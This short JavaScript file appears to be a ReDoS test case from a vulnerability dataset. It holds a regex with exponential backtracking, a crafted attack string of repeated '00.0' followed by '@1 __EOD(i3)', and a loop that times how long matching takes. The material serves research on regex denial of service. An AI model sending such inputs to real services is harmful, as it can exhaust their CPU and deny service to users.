/* 7924
 * \b((([&quot;'/,&amp;%\:\(\)\$\+\-\*\w\000-\032])|(-*\d+\.\d+[%]*))+[\s]+)+\b[\w&quot;',%\(\)]+[.!?](['&quot;\s]|$)
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"00.0"*16+"@1 __EOD(i3)"
 */
var REGEX = new RegExp("\b((([&quot;'/,&amp;%\:\(\)\$\+\-\*\w\000-\032])|(-*\d+\.\d+[%]*))+[\s]+)+\b[\w&quot;',%\(\)]+[.!?](['&quot;\s]|$)")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '00.0'.repeat(i*1) + '@1 __EOD(i3)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}